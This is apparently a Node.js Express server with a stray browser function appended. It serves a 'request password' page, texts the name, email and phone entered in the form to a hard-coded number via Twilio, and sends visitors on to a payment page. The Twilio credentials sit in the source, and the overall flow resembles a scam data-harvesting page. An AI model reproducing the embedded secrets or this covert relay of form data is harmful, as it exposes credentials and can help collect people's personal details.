const express = require('express');
const bodyParser = require('body-parser');
const twilio = require('twilio');

const app = express();
const port = 3000;

// Twilio credentials
const accountSid = 'USf9cbd05e987c5513941bc60f2e7fce1a';
const authToken = 'c501df9e6fce9aeeba31390213fa05e7';
const twilioPhoneNumber = '+2348138273086';

const client = twilio(accountSid, authToken);

// Body parser middleware to handle POST requests
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the HTML page
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/request password.html');
});

// Handle form submission
app.post('/submit', (req, res) => {
  const receiverName = req.body.receiverName;
  const receiverEmail = req.body.receiverEmail;
  const receiverPhone = req.body.receiverPhone;

  // Construct the message
  const message = `Receiver Details:\nName: ${receiverName}\nEmail: ${receiverEmail}\nPhone: ${receiverPhone}`;

  // Send message using Twilio
  client.messages
    .create({
      body: message,
      from: twilioPhoneNumber,
      to: '+2348138273086' // Replace with your phone or WhatsApp number
    })
    .then(() => {
      res.send('Message sent successfully!');
    })
    .catch((error) => {
      console.error('Error sending message:', error);
      res.status(500).send('Error sending message');
    });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
    function redirectToPage() {
      // Get receiver details from form
      var receiverName = document.getElementById('receiverName').value;
      var receiverEmail = document.getElementById('receiverEmail').value;
      var receiverPhone = document.getElementById('receiverPhone').value;

      // Check if all required fields are filled
      if (!receiverName || !receiverEmail || !receiverPhone) {
        alert("Please fill in all required fields");
        return;
      }

      // Redirect to another page
      window.location.href = 'Payment-method.html'; // Replace with your desired URL
    }
    
   